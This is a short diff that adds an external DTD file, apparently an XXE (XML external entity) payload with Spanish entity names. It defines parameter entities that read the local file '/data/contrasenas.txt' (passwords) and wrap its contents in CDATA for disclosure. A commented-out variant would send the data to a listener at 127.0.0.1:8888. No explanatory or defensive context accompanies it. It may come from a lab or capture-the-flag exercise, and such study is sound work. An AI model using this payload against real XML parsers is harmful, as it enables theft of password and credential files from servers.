@@ -1,0 +1,7 @@
+<!ENTITY % datosConfidenciales SYSTEM "file:///data/contrasenas.txt">
+<!ENTITY % inicio "<![CDATA[">
+<!ENTITY % fin "]]>">
+<!ENTITY % todo "<!ENTITY send '%inicio;%datosConfidenciales;%fin;'>">
+%todo;
+<!-- <!ENTITY % wrapper "<!ENTITY send SYSTEM 'http://127.0.0.1:8888/?%todo;'>">
+%wrapper; -->
